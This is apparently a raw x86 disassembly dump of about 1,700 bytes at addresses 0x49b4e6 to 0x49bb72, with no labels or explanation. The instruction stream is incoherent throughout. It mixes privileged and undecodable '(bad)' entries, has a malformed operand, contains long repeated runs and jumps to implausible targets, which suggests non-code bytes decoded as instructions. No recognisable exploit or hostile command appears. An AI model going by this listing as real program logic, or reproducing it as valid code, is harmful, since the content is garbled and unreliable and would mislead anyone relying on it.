  49b4e6:	iret   
  49b4e7:	xor    esi,ebp
  49b4e9:	rcl    BYTE PTR [ecx],cl
  49b4eb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b4ec:	jae    0x49b529
  49b4ee:	xor    ch,BYTE PTR [esi]
  49b4f0:	popf   
  49b4f1:	pushf  
  49b4f2:	fcomp  QWORD PTR [edi]
  49b4f4:	xor    DWORD PTR [ecx],esi
  49b4f6:	xor    BYTE PTR [ebx-0x21],bh
  49b4f9:	aad    0xa4
  49b4fb:	adc    DWORD PTR [ebx],ebx
  49b4fd:	xor    al,0x1f
  49b4ff:	inc    esi
  49b500:	daa    
  49b501:	daa    
  49b502:	daa    
  49b503:	daa    
  49b504:	inc    ebp
  49b505:	inc    ebp
  49b506:	inc    esp
  49b507:	inc    esp
  49b508:	and    BYTE PTR [esi],0x27
  49b50b:	daa    
  49b50c:	inc    ebx
  49b50d:	inc    ebx
  49b50e:	cmp    DWORD PTR [ecx+0x391f851d],edi
  49b514:	fistp  QWORD PTR [ecx]
  49b516:	cmp    DWORD PTR [eax],esi
  49b518:	cmp    DWORD PTR [ecx],edi
  49b51a:	cmp    DWORD PTR [eax],edi
  49b51c:	cmp    BYTE PTR [eax],bh
  49b51e:	cmp    DWORD PTR [ecx+0x373f4c9d],edi
  49b524:	ss pop ds
  49b526:	ss xor eax,0x39393939
  49b52c:	xor    eax,0x66333434
  49b531:	jecxz  0x49b559
  49b533:	xor    DWORD PTR [edi-0x1],ebp
  49b536:	cmp    DWORD PTR [esp+ebx*4+0x1f384edc],ebx
  49b53d:	cmp    BYTE PTR [edi],dh
  49b53f:	aaa    
  49b540:	pushf  
  49b541:	pushf  
  49b542:	pushf  
  49b543:	pushf  
  49b544:	ss ss xor eax,0x9c9c9c35
  49b54b:	pushf  
  49b54c:	xor    al,0x34
  49b54e:	xor    esi,DWORD PTR [ebx]
  49b550:	pop    ebx
  49b551:	aam    0x9b
  49b553:	pushf  
  49b554:	xor    cl,BYTE PTR [edi]
  49b556:	daa    
  49b557:	fild   WORD PTR [ecx+ecx*4]
  49b55a:	mov    bh,0xff
  49b55c:	inc    ecx
  49b55d:	pop    edi
  49b55e:	xor    BYTE PTR [esi+0x4e],al
  49b561:	dec    esi
  49b562:	outs   dx,BYTE PTR ds:[esi]
  49b563:	daa    
  49b564:	inc    esi
  49b565:	pop    ds
  49b566:	inc    ebp
  49b567:	inc    ebp
  49b568:	inc    esp
  49b569:	dec    esi
  49b56a:	dec    esi
  49b56b:	dec    esi
  49b56c:	dec    esi
  49b56d:	inc    esp
  49b56e:	inc    ebx
  49b56f:	inc    ebx
  49b570:	inc    edx
  49b571:	dec    esp
  49b572:	dec    esi
  49b573:	dec    esi
  49b574:	dec    esi
  49b575:	inc    edx
  49b576:	inc    ecx
  49b577:	inc    ecx
  49b578:	xor    al,cl
  49b57a:	stos   BYTE PTR es:[edi],al
  49b57b:	fs lahf 
  49b57d:	inc    DWORD PTR [ecx-0x37]
  49b580:	leave  
  49b581:	leave  
  49b582:	ins    BYTE PTR es:[edi],dx
  49b583:	pop    ds
  49b584:	aaa    
  49b585:	aaa    
  49b586:	ss leave 
  49b588:	leave  
  49b589:	leave  
  49b58a:	leave  
  49b58b:	ss xor eax,0xc9c93435
  49b591:	leave  
  49b592:	leave  
  49b593:	xor    al,0x33
  49b595:	xor    esi,DWORD PTR [edx]
  49b597:	push   es
  49b598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b599:	or     ecx,0x32
  49b59c:	out    dx,eax
  49b59d:	daa    
  49b59e:	daa    
  49b59f:	pop    ebp
  49b5a0:	mov    ds:0x46305fbf,al
  49b5a5:	inc    esi
  49b5a6:	dec    esi
  49b5a7:	dec    esi
  49b5a8:	dec    esi
  49b5a9:	outs   dx,BYTE PTR ds:[esi]
  49b5aa:	pop    ds
  49b5ab:	inc    ebp
  49b5ac:	inc    ebp
  49b5ad:	inc    esp
  49b5ae:	inc    esp
  49b5af:	dec    esi
  49b5b0:	dec    esi
  49b5b1:	dec    esi
  49b5b2:	dec    esi
  49b5b3:	inc    ebx
  49b5b4:	inc    ebx
  49b5b5:	inc    edx
  49b5b6:	inc    edx
  49b5b7:	dec    esp
  49b5b8:	dec    esi
  49b5b9:	dec    esi
  49b5ba:	dec    esi
  49b5bb:	inc    ecx
  49b5bc:	inc    ecx
  49b5bd:	cmp    DWORD PTR [edx+esi*2-0x3f],ebp
  49b5c1:	xor    al,0xf
  49b5c3:	inc    edx
  49b5c4:	inc    DWORD PTR [edx+0x1f]
  49b5c7:	leave  
  49b5c8:	leave  
  49b5c9:	leave  
  49b5ca:	leave  
  49b5cb:	aaa    
  49b5cc:	ss ss xor eax,0xc9c9c9c9
  49b5d3:	xor    eax,0xc9333434
  49b5d8:	leave  
  49b5d9:	leave  
  49b5da:	leave  
  49b5db:	xor    esi,DWORD PTR [edx]
  49b5dd:	xor    dh,BYTE PTR [ecx]
  49b5df:	fcom   QWORD PTR [esi+0x4d]
  49b5e2:	mov    ebp,0x463f970f
  49b5e7:	cmp    DWORD PTR [ecx],edi
  49b5e9:	mov    ecx,0x451f469d
  49b5ee:	inc    ebp
  49b5ef:	inc    esp
  49b5f0:	cmp    DWORD PTR [ecx],edi
  49b5f2:	cmp    DWORD PTR [ecx],edi
  49b5f4:	inc    esp
  49b5f5:	inc    ebx
  49b5f6:	inc    ebx
  49b5f7:	inc    edx
  49b5f8:	cmp    DWORD PTR [ecx],edi
  49b5fa:	cmp    DWORD PTR [ecx],edi
  49b5fc:	inc    edx
  49b5fd:	inc    ecx
  49b5fe:	inc    ecx
  49b5ff:	cmp    DWORD PTR [ebx],ebp
  49b601:	nop
  49b602:	xor    eax,0x262f3939
  49b607:	mov    bl,0xc9
  49b609:	add    al,0xff
  49b60b:	inc    ebx
  49b60c:	pop    ds
  49b60d:	ss leave 
  49b60f:	leave  
  49b610:	dec    ecx
  49b611:	retf   
  49b612:	nop    DWORD PTR ds:0xc9c93435
  49b619:	leave  
  49b61a:	leave  
  49b61b:	xor    al,0x33
  49b61d:	xor    esi,DWORD PTR [edx]
  49b61f:	or     cl,0xc9
  49b622:	leave  
  49b623:	xor    dh,BYTE PTR [ecx]
  49b625:	xor    DWORD PTR [eax+ebx*1],esi
  49b628:	xchg   esp,eax
  49b629:	nop
  49b62a:	mov    bh,0xff
  49b62c:	inc    ebx
  49b62d:	jb     0x49b661
  49b62f:	fwait
  49b630:	pushf  
  49b631:	inc    ebx
  49b632:	pop    ds
  49b633:	inc    ebp
  49b634:	inc    esp
  49b635:	jb     0x49b6a9
  49b637:	jb     0x49b6ab
  49b639:	inc    esp
  49b63a:	inc    ebx
  49b63b:	inc    ebx
  49b63c:	inc    edx
  49b63d:	jb     0x49b6b1
  49b63f:	jb     0x49b6b3
  49b641:	inc    edx
  49b642:	inc    ecx
  49b643:	inc    ecx
  49b644:	cmp    DWORD PTR [ebp+0x61],esp
  49b647:	jb     0x49b6bb
  49b649:	cmp    DWORD PTR [eax],edi
  49b64b:	xchg   bx,ax
  49b64d:	or     DWORD PTR [esi-0x49],edx
  49b650:	inc    DWORD PTR [edi+ebx*1+0x36]
  49b654:	dec    esi
  49b655:	dec    esi
  49b656:	dec    esi
  49b657:	dec    esi
  49b658:	xor    eax,0x4e343435
  49b65d:	dec    esi
  49b65e:	dec    esi
  49b65f:	dec    esi
  49b660:	xor    esi,DWORD PTR [ebx]
  49b662:	xor    dh,BYTE PTR [edx]
  49b664:	dec    esp
  49b665:	dec    esi
  49b666:	dec    esi
  49b667:	dec    esi
  49b668:	xor    DWORD PTR [ecx],esi
  49b66a:	xor    BYTE PTR [edx-0x2e],dh
  49b66d:	and    BYTE PTR [ecx],dh
  49b66f:	ud0    eax,DWORD PTR [esp+eax*2-0x37]
  49b674:	leave  
  49b675:	leave  
  49b676:	ins    BYTE PTR es:[edi],dx
  49b677:	pop    ds
  49b678:	inc    esp
  49b679:	inc    esp
  49b67a:	inc    ebx
  49b67b:	leave  
  49b67c:	leave  
  49b67d:	leave  
  49b67e:	leave  
  49b67f:	inc    ebx
  49b680:	inc    edx
  49b681:	inc    edx
  49b682:	inc    ecx
  49b683:	leave  
  49b684:	leave  
  49b685:	leave  
  49b686:	leave  
  49b687:	inc    ecx
  49b688:	cmp    DWORD PTR [ecx],edi
  49b68a:	cmp    BYTE PTR [ecx],cl
  49b68c:	push   esi
  49b68d:	test   eax,0xff0f38c9
  49b692:	dec    esi
  49b693:	dec    esi
  49b694:	xchg   bx,ax
  49b696:	inc    ebp
  49b697:	pop    ds
  49b698:	xor    eax,0x4e4e3435
  49b69d:	dec    esi
  49b69e:	dec    esi
  49b69f:	xor    al,0x33
  49b6a1:	xor    esi,DWORD PTR [edx]
  49b6a3:	dec    esi
  49b6a4:	dec    esi
  49b6a5:	dec    esi
  49b6a6:	dec    esi
  49b6a7:	xor    dh,BYTE PTR [ecx]
  49b6a9:	xor    DWORD PTR [eax],esi
  49b6ab:	dec    ebp
  49b6ac:	cmp    al,bl
  49b6ae:	dec    esi
  49b6af:	xor    bh,bh
  49b6b1:	out    dx,eax
  49b6b2:	outs   dx,DWORD PTR ds:[esi]
  49b6b3:	dec    esp
  49b6b4:	call   0x33d7e3df
  49b6b9:	push   cs
  49b6ba:	push   ss
  49b6bb:	xor    DWORD PTR [eax+0x14df3f44],esp
  49b6c1:	xchg   edx,eax
  49b6c2:	push   es
  49b6c3:	and    eax,0x930e731f
  49b6c8:	out    dx,eax
  49b6c9:	popa   
  49b6ca:	das    
  49b6cb:	wrmsr  
  49b6cd:	push   ds
  49b6ce:	call   0x3839:0x3fdc9c9c
  49b6d5:	cmp    BYTE PTR [eax+0x2fd52114],cl
  49b6db:	push   cs
  49b6dc:	inc    esi
  49b6dd:	hlt    
  49b6de:	sub    eax,0xbfaab5b0
  49b6e3:	rdtsc  
  49b6e5:	mov    ecx,0xeba0a908
  49b6ea:	aas    
  49b6eb:	xor    esp,DWORD PTR [edi]
  49b6ed:	daa    
  49b6ee:	pop    es
  49b6ef:	dec    edi
  49b6f0:	pop    ebx
  49b6f1:	jle    0x49b728
  49b6f3:	xor    al,0x34
  49b6f5:	dec    esi
  49b6f6:	dec    esi
  49b6f7:	dec    esi
  49b6f8:	outs   dx,BYTE PTR ds:[esi]
  49b6f9:	aas    
  49b6fa:	xor    al,0x34
  49b6fc:	xor    esi,DWORD PTR [ebx]
  49b6fe:	or     BYTE PTR [eax+ebp*8+0x4d],ah
  49b702:	ud0    ecx,ecx
  49b705:	daa    
  49b706:	pop    edi
  49b707:	xchg   edi,eax
  49b708:	sti    
  49b709:	aaa    
  49b70a:	(bad)  
  49b70c:	cmp    DWORD PTR [eax],eax
  49b70e:	xor    eax,0xcb71956d
  49b713:	xor    al,0x2
  49b715:	jmp    0x49b776
  49b717:	push   0x30c01520
  49b71c:	inc    ebx
  49b71d:	retf   
  49b71e:	leave  
  49b71f:	mov    cl,0xf7
  49b721:	pop    ebx
  49b722:	pop    ds
  49b723:	cmovb  eax,DWORD PTR [ecx-0x54]
  49b727:	inc    ebx
  49b728:	fld    QWORD PTR [ebx]
  49b72a:	retf   0xdf0e
  49b72d:	cmp    DWORD PTR [edx-0x1e],eax
  49b730:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  49b731:	das    
  49b732:	scas   al,BYTE PTR es:[edi]
  49b733:	cmp    BYTE PTR [esi],al
  49b735:	push   esi
  49b736:	popa   
  49b737:	sbb    DWORD PTR [edi+ebx*4+0x61],eax
  49b73b:	mov    ecx,0x7f87077d
  49b740:	inc    esi
  49b741:	cmovae edi,DWORD PTR [eax]
  49b744:	cmp    DWORD PTR [ebx+ebx*1+0x32350f4a],esp
  49b74b:	xor    BYTE PTR [eax+0x6f2e5c5c],bl
  49b751:	inc    ebp
  49b752:	cmp    BYTE PTR [esi],bh
  49b754:	aaa    
  49b755:	jo     0x49b7bf
  49b757:	lods   al,BYTE PTR ds:[esi]
  49b758:	sbb    bl,cl
  49b75a:	sub    esi,DWORD PTR [eax]
  49b75c:	jb     0x49b76f
  49b75e:	ror    BYTE PTR [edi],cl
  49b760:	lahf   
  49b761:	ss inc esi
  49b763:	out    0xaa,al
  49b765:	lock scas al,BYTE PTR es:[edi]
  49b767:	(bad)  
  49b768:	sbb    ebp,DWORD PTR [edi-0x636461bc]
  49b76e:	je     0x49b77f
  49b770:	cmp    BYTE PTR [edx],dh
  49b772:	mov    ebx,0x9adee97f
  49b777:	fmul   QWORD PTR [edi]
  49b779:	xor    BYTE PTR [esi+0xf],ah
  49b77c:	xor    eax,DWORD PTR [esi]
  49b77e:	mov    dh,0xe7
  49b780:	xor    BYTE PTR [edi-0x1b99f091],ch
  49b786:	or     BYTE PTR [ebx+0x3635feaf],ch
  49b78c:	pop    ecx
  49b78d:	dec    edx
  49b78e:	scas   al,BYTE PTR es:[edi]
  49b78f:	or     bh,bl
  49b791:	cmp    edi,ecx
  49b793:	jae    0x49b75f
  49b795:	inc    eax
  49b796:	test   DWORD PTR [esi-0x71],eax
  49b799:	cmp    BYTE PTR [edi],ch
  49b79b:	lar    ebx,bx
  49b79e:	cmp    eax,eax
  49b7a0:	cmp    edi,edi
  49b7a2:	movaps XMMWORD PTR [edx+0x4fdadedc],xmm3
  49b7a9:	rdtsc  
  49b7ab:	daa    
  49b7ac:	xchg   ebx,eax
  49b7ad:	fild   DWORD PTR [eax-0x7c]
  49b7b0:	cmp    DWORD PTR [edi],edi
  49b7b2:	aaa    
  49b7b3:	rdmsr  
  49b7b5:	cs mov esp,cs
  49b7b8:	xor    DWORD PTR [esi],0xdf4145ff
  49b7be:	ds inc esi
  49b7c0:	retw   0x458f
  49b7c4:	inc    edx
  49b7c5:	push   cs
  49b7c6:	inc    ecx
  49b7c7:	cdq    
  49b7c8:	xchg   ecx,eax
  49b7c9:	daa    
  49b7ca:	dec    esp
  49b7cb:	dec    esi
  49b7cc:	cmp    BYTE PTR [ecx],bh
  49b7ce:	and    DWORD PTR [edi+edi*4],0x450f1f90
  49b7d5:	mov    bh,0x89
  49b7d7:	add    edx,edi
  49b7d9:	pop    edi
  49b7da:	xor    cl,BYTE PTR [edi]
  49b7dc:	ss wrmsr 
  49b7df:	sub    DWORD PTR [eax+0x25],esi
  49b7e2:	es pop es
  49b7e4:	inc    esi
  49b7e5:	jmp    ecx
  49b7e7:	push   es
  49b7e8:	sbb    edx,DWORD PTR [ecx+0x1c313732]
  49b7ee:	loope  0x49b81d
  49b7f0:	adc    ebp,edi
  49b7f2:	inc    edx
  49b7f3:	sar    DWORD PTR [esi-0x3ee373ca],cl
  49b7f9:	mov    WORD PTR [edi],?
  49b7fb:	sahf   
  49b7fc:	xor    eax,0x1275c144
  49b801:	mov    BYTE PTR [edi+0x44],ch
  49b804:	dec    edi
  49b805:	cmp    ah,al
  49b807:	nop
  49b808:	outs   dx,BYTE PTR ds:[esi]
  49b809:	rdpmc  
  49b80b:	xor    eax,0xdbdf37ef
  49b810:	push   cs
  49b811:	pop    edx
  49b812:	ror    BYTE PTR [edi+0xf],cl
  49b815:	out    dx,eax
  49b816:	inc    ebx
  49b817:	add    eax,0xf26e937
  49b81c:	xor    eax,0x2b5f5f2a
  49b821:	ret    0x41c9
  49b824:	cmp    edi,edi
  49b826:	or     ecx,DWORD PTR ds:0xa3026558
  49b82c:	dec    edi
  49b82d:	xor    BYTE PTR [ecx-0x50c88923],bh
  49b833:	sahf   
  49b834:	fild   WORD PTR [ebp+0x59]
  49b837:	das    
  49b838:	and    DWORD PTR [edi],ebp
  49b83a:	jg     0x49b86e
  49b83c:	adc    ecx,DWORD PTR [esi+0x2e]
  49b83f:	fild   QWORD PTR [esi-0x39]
  49b842:	cmovno esi,DWORD PTR [edi]
  49b845:	xor    DWORD PTR [ecx+0x424e9e4d],ebx
  49b84b:	jle    0x49b891
  49b84d:	dec    edi
  49b84e:	cmp    BYTE PTR [ebp+0x38380d6f],bh
  49b854:	dec    edi
  49b855:	jmp    0x49b89c
  49b857:	iret   
  49b858:	ins    BYTE PTR es:[edi],dx
  49b859:	enter  0x9805,0xf
  49b85d:	xor    al,0xcf
  49b85f:	inc    ebp
  49b860:	setl   BYTE PTR [edi+ecx*4-0x37]
  49b865:	xor    cl,dl
  49b867:	(bad)  
  49b869:	xor    al,cl
  49b86b:	add    eax,0xaeca98d6
  49b870:	cmp    DWORD PTR [ecx+0x314ca702],ecx
  49b876:	jle    0x49b807
  49b878:	clc    
  49b879:	(bad)  
  49b87a:	fistp  WORD PTR [ecx+0x5f5f0137]
  49b880:	jbe    0x49b8e4
  49b882:	popa   
  49b883:	inc    ecx
  49b884:	jb     0x49b8ff
  49b886:	inc    ebx
  49b887:	outs   dx,DWORD PTR ds:[esi]
  49b888:	outs   dx,BYTE PTR ds:[esi]
  49b889:	jae    0x49b8ff
  49b88b:	jb     0x49b902
  49b88d:	arpl   WORD PTR [edx+esi*1+0x44],si
  49b891:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49b892:	stos   DWORD PTR es:[edi],eax
  49b893:	adc    eax,0x477be77f
  49b898:	test   BYTE PTR [eax],dh
  49b89a:	and    DWORD PTR [edi+0x46],0x7ac251ba
  49b8a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49b8a2:	xchg   ebx,eax
  49b8a3:	rdpmc  
  49b8a5:	sub    ecx,DWORD PTR [esi-0x52]
  49b8a8:	dec    esi
  49b8a9:	aaa    
  49b8aa:	out    0x46,al
  49b8ac:	inc    esi
  49b8ad:	daa    
  49b8ae:	fsubr  DWORD PTR [eax+0x0]
  49b8b1:	xchg   ebx,eax
  49b8b2:	inc    esi
  49b8b3:	add    esp,0x1a
  49b8b6:	push   ss
  49b8b7:	cmp    BYTE PTR [edi+0x5a],al
  49b8ba:	aaa    
  49b8bb:	pop    es
  49b8bc:	jbe    0x49b8a6
  49b8be:	dec    ebx
  49b8bf:	jae    0x49b920
  49b8c1:	(bad)  
  49b8c2:	mov    ebx,0x77d09371
  49b8c7:	mov    cs,WORD PTR [edi]
  49b8c9:	in     eax,dx
  49b8ca:	sbb    bl,0x63
  49b8cd:	add    ch,BYTE PTR [edi]
  49b8cf:	inc    ecx
  49b8d0:	outs   dx,DWORD PTR ds:[esi]
  49b8d1:	inc    ecx
  49b8d2:	das    
  49b8d3:	dec    ebp
  49b8d4:	jle    0x49b893
  49b8d6:	leave  
  49b8d7:	cmp    BYTE PTR [edi],cl
  49b8d9:	ja     0x49b90b
  49b8db:	pop    edx
  49b8dc:	add    BYTE PTR [ebx-0x67],ch
  49b8df:	jg     0x49b916
  49b8e1:	jmp    0x49b8a0
  49b8e3:	and    eax,0x7eafb815
  49b8e8:	xor    ah,BYTE PTR [edi]
  49b8ea:	or     bl,BYTE PTR [edx]
  49b8ec:	xchg   ecx,eax
  49b8ed:	imul   edi,DWORD PTR [edi],0x66bb6391
  49b8f3:	lahf   
  49b8f4:	xor    cl,BYTE PTR [edi]
  49b8f6:	ret    
  49b8f7:	hlt    
  49b8f8:	fmul   QWORD PTR [edx]
  49b8fa:	jo     0x49b8f3
  49b8fc:	adc    ebp,edi
  49b8fe:	xchg   edi,eax
  49b8ff:	jmp    0xcf32:0xb37b60c1
  49b906:	sahf   
  49b907:	xor    esi,DWORD PTR [ecx]
  49b909:	mov    ebp,0xa7b74347
  49b90e:	push   cs
  49b90f:	pop    ebx
  49b910:	outs   dx,DWORD PTR ds:[esi]
  49b911:	test   eax,0xda5805b8
  49b916:	xchg   DWORD PTR [esi],ecx
  49b918:	aas    
  49b919:	cmp    eax,0x47ff0301
  49b91e:	outs   dx,BYTE PTR gs:[esi]
  49b920:	gs jb  0x49b984
  49b923:	je     0x49b98a
  49b925:	and    DWORD PTR [ebx-0x80],esi
  49b928:	push   ebp
  49b929:	or     dl,bh
  49b92b:	inc    ebp
  49b92c:	jb     0x49b9a0
  49b92e:	outs   dx,DWORD PTR ds:[esi]
  49b92f:	jb     0x49b900
  49b931:	fild   WORD PTR [esi]
  49b933:	loop   0x49b92a
  49b935:	fild   WORD PTR [edx-0x27bae045]
  49b93b:	and    DWORD PTR [ebx+eax*1+0x2294bb1f],ebp
  49b942:	dec    edi
  49b943:	mov    eax,0x1302e13
  49b948:	push   esi
  49b949:	dec    ebx
  49b94a:	mov    eax,0xfbf87c7
  49b94f:	clc    
  49b950:	js     0x49b916
  49b952:	pop    es
  49b953:	xchg   ebx,eax
  49b954:	out    dx,eax
  49b955:	lods   eax,DWORD PTR ds:[esi]
  49b956:	mov    edx,0x3f34be58
  49b95b:	xor    eax,0xc3d10f7f
  49b960:	sub    al,BYTE PTR [eax+0x2f]
  49b963:	retf   
  49b964:	mov    edi,0x607e5058
  49b969:	jg     0x49b9a1
  49b96b:	xor    cl,cl
  49b96d:	nop    DWORD PTR [ebx]
  49b970:	fistp  QWORD PTR [eax]
  49b972:	inc    edx
  49b973:	stc    
  49b974:	push   ds
  49b975:	xchg   ecx,eax
  49b976:	cmp    DWORD PTR [edi+0x330f6634],ecx
  49b97c:	pop    es
  49b97d:	mov    eax,0x7f8b3506
  49b982:	adc    edx,DWORD PTR [esi-0x68]
  49b985:	jl     0x49b996
  49b987:	xor    DWORD PTR [edx+0x5e],ebp
  49b98a:	add    ah,BYTE PTR [ebp-0x8bc34ee]
  49b990:	iret   
  49b991:	lds    esp,FWORD PTR [edx]
  49b993:	inc    esp
  49b994:	push   cs
  49b995:	xor    edi,ebx
  49b997:	jbe    0x49b977
  49b999:	add    eax,0x300fbe4e
  49b99e:	ss jg  0x49b99c
  49b9a1:	leave  
  49b9a2:	int3   
  49b9a3:	pop    esp
  49b9a4:	xchg   DWORD PTR [edi+0x41],ecx
  49b9a7:	sysenter 
  49b9a9:	popa   
  49b9aa:	ret    0x8e6d
  49b9ad:	das    
  49b9ae:	xor    DWORD PTR [edi+0x49f45f42],ecx
  49b9b4:	sub    dl,BYTE PTR [edx+eax*2+0x4955424e]
  49b9bb:	xor    DWORD PTR [ecx-0x52],ecx
  49b9be:	and    al,0x8f
  49b9c0:	fdivr  DWORD PTR [edi-0x6a]
  49b9c3:	xor    dl,BYTE PTR [edi]
  49b9c5:	lea    ecx,[edi]
  49b9c7:	stos   DWORD PTR es:[edi],eax
  49b9c8:	gs xor eax,0x49666357
  49b9ce:	test   eax,0x1e35f96
  49b9d3:	outs   dx,DWORD PTR ds:[esi]
  49b9d4:	jns    0x49b996
  49b9d6:	push   esi
  49b9d7:	inc    esi
  49b9d8:	rcl    DWORD PTR [ebp-0x20],cl
  49b9db:	jmp    0x49b9bd
  49b9dd:	(bad)  
  49b9de:	mov    bh,0xd7
  49b9e0:	xlat   BYTE PTR ds:[ebx]
  49b9e1:	cmp    dl,BYTE PTR [edx-0x5a]
  49b9e4:	shl    BYTE PTR ds:0xc8bf45f7,1
  49b9ea:	xchg   esi,eax
  49b9eb:	outs   dx,DWORD PTR ds:[esi]
  49b9ec:	adc    eax,0xf38cf47
  49b9f1:	jb     0x49b978
  49b9f3:	add    eax,0xa62faf07
  49b9f8:	aaa    
  49b9f9:	pushf  
  49b9fa:	pop    esp
  49b9fb:	xor    DWORD PTR [edx],esi
  49b9fd:	xor    al,0x45
  49b9ff:	pop    es
  49ba00:	xor    al,0x45
  49ba02:	cmp    al,0xa3
  49ba04:	adc    eax,0x2be74287
  49ba09:	dec    edi
  49ba0a:	mov    eax,ds:0xcf05448c
  49ba0f:	jnp    0x49ba69
  49ba11:	pushf  
  49ba12:	xchg   edx,eax
  49ba13:	push   ss
  49ba14:	pop    ss
  49ba15:	dec    edx
  49ba16:	mov    ch,0x22
  49ba18:	adc    dh,BYTE PTR [ebx+0xf66f97f]
  49ba1e:	jmp    0x49ba6f
  49ba20:	sbb    ebx,DWORD PTR [edi]
  49ba22:	inc    edx
  49ba23:	rdpmc  
  49ba25:	pop    ds
  49ba26:	xor    cl,bh
  49ba28:	cmp    BYTE PTR [ebx-0x5a],al
  49ba2b:	inc    esi
  49ba2c:	daa    
  49ba2d:	aaa    
  49ba2e:	retf   0xc135
  49ba31:	sub    DWORD PTR [edi+0x162a3727],esp
  49ba37:	lea    ecx,[ecx]
  49ba39:	xlat   BYTE PTR ds:[ebx]
  49ba3a:	pop    ss
  49ba3b:	das    
  49ba3c:	xor    DWORD PTR [esi+0x70467163],eax
  49ba42:	xor    cl,BYTE PTR [edi+0x39]
  49ba45:	and    eax,DWORD PTR [edx]
  49ba47:	pop    ss
  49ba48:	dec    ebx
  49ba49:	fisttp DWORD PTR [edi]
  49ba4b:	xchg   DWORD PTR [esi],esi
  49ba4d:	pop    eax
  49ba4e:	jo     0x49ba0b
  49ba50:	push   esi
  49ba51:	aas    
  49ba52:	out    0x82,eax
  49ba54:	(bad)  [edi]
  49ba56:	pshufw mm1,QWORD PTR [edi],0x87
  49ba5a:	dec    edx
  49ba5b:	pop    ss
  49ba5c:	xor    al,BYTE PTR [edx-0x35]
  49ba5f:	pop    es
  49ba60:	es daa 
  49ba62:	xor    al,0x2e
  49ba64:	xor    BYTE PTR [ecx+0x2a],dl
  49ba67:	adc    al,0x1
  49ba69:	jecxz  0x49ba0a
  49ba6b:	jnp    0x49bace
  49ba6d:	shr    BYTE PTR [ecx-0x51],cl
  49ba70:	xor    DWORD PTR [esi],ecx
  49ba72:	pop    ds
  49ba73:	mov    edi,0x3430f90e
  49ba78:	mov    DWORD PTR [ecx+0x46],0x26bc38f7
  49ba7f:	daa    
  49ba80:	daa    
  49ba81:	xor    DWORD PTR [ecx+0x46],eax
  49ba84:	clc    
  49ba85:	pop    eax
  49ba86:	mov    cl,0x62
  49ba88:	pop    edi
  49ba89:	inc    ebx
  49ba8a:	xlat   BYTE PTR ds:[ebx]
  49ba8b:	push   es
  49ba8c:	pop    edx
  49ba8d:	dec    edi
  49ba8e:	sub    ebp,DWORD PTR [ebx-0x31]
  49ba91:	mov    bh,0x62
  49ba93:	jmp    0x49ba67
  49ba95:	xchg   ecx,eax
  49ba96:	aaa    
  49ba97:	sbb    eax,DWORD PTR [ecx-0x61]
  49ba9a:	cmp    dh,BYTE PTR [ecx-0x50]
  49ba9d:	cmp    al,0xfe
  49ba9f:	inc    edx
  49baa0:	pop    ebx
  49baa1:	pmaxub mm0,mm3
  49baa4:	stos   BYTE PTR es:[edi],al
  49baa5:	rol    DWORD PTR [edx],1
  49baa7:	pop    edi
  49baa8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  49baa9:	out    dx,eax
  49baaa:	pop    ebp
  49baab:	(bad)
  49baaf:	cmp    BYTE PTR [edx-0x11],al
  49bab2:	imul   ebp,ecx,0x3f02bb6b
  49bab8:	lahf   
  49bab9:	sub    al,0x96
  49babb:	mov    ecx,0x416f9b52
  49bac0:	xchg   BYTE PTR [ebx+ebx*1+0x532f54ff],ch
  49bac7:	je     0x49bb3b
  49bac9:	dec    ebp
  49baca:	outs   dx,DWORD PTR ds:[esi]
  49bacb:	jbe    0x49bb32
  49bacd:	addr16 aas 
  49bacf:	xor    BYTE PTR [edx],bh
  49bad1:	ss jnp 0x49ba73
  49bad4:	out    0x37,eax
  49bad6:	lock pusha 
  49bad8:	sub    DWORD PTR [edi+ebp*1],esp
  49badb:	mov    dh,0xa7
  49badd:	add    al,0xbb
  49badf:	(bad)  
  49bae0:	lahf   
  49bae1:	xlat   BYTE PTR ds:[ebx]
  49bae2:	pop    ds
  49bae3:	xchg   ebp,eax
  49bae4:	or     bh,BYTE PTR [ebp-0x70d0214b]
  49baea:	cmp    BYTE PTR [ecx-0x13],ch
  49baed:	and    BYTE PTR [ebx+0x582d38af],0xd7
  49baf4:	(bad)  
  49baf5:	mov    edi,0x83a893c3
  49bafa:	pop    es
  49bafb:	(bad)  
  49bafc:	outs   dx,DWORD PTR ds:[esi]
  49bafd:	aaa    
  49bafe:	mov    ds:0xa36b41d8,eax
  49bb03:	jmp    0x49bac6
  49bb05:	pop    esp
  49bb06:	and    al,0x0
  49bb08:	pop    DWORD PTR [ecx-0x6b]
  49bb0b:	sub    DWORD PTR [edx+edx*8-0xd],0x1923d335
  49bb13:	mov    edx,0x8fdf62e3
  49bb18:	ss adc al,0xac
  49bb1b:	mov    esi,DWORD PTR [ebx+ebx*8]
  49bb1e:	das    
  49bb1f:	push   ss
  49bb20:	mov    esp,0x8f6fe842
  49bb25:	xor    BYTE PTR [edi-0x6f],bh
  49bb28:	or     ebp,DWORD PTR [ebx+edi*4+0x67]
  49bb2c:	inc    edi
  49bb2d:	mov    es,WORD PTR [edx-0x57]
  49bb30:	xchg   ebp,esp
  49bb32:	adc    ebp,DWORD PTR [esi+0x39]
  49bb35:	jecxz  0x49bbaf
  49bb37:	pop    edx
  49bb38:	lock push esi
  49bb3a:	lahf   
  49bb3b:	idiv   DWORD PTR [edi+0x27]
  49bb3e:	dec    esp
  49bb3f:	pop    esi
  49bb40:	sub    eax,0xf738be15
  49bb45:	sub    BYTE PTR ss:[esi-0x41c487f9],dl
  49bb4c:	inc    esp
  49bb4d:	aaa    
  49bb4e:	mov    ch,BYTE PTR [ecx]
  49bb50:	loope  0x49bb91
  49bb52:	push   esi
  49bb53:	popa   
  49bb54:	jb     0x49bb99
  49bb56:	outs   dx,DWORD PTR ds:[esi]
  49bb57:	jo     0x49bbd2
  49bb59:	ja     0x49bbd4
  49bb5b:	xor    BYTE PTR [ebx],bh
  49bb5d:	inc    edx
  49bb5e:	out    0xb7,eax
  49bb60:	inc    edx
  49bb61:	mov    edi,0x4dc1e445
  49bb66:	aaa    
  49bb67:	or     bh,BYTE PTR [edi]
  49bb69:	xor    DWORD PTR [edi-0x1d17abbd],ebp
  49bb6f:	cmp    bh,BYTE PTR [ecx]
  49bb71:	push   edi
  49bb72:	xor    al,0xef
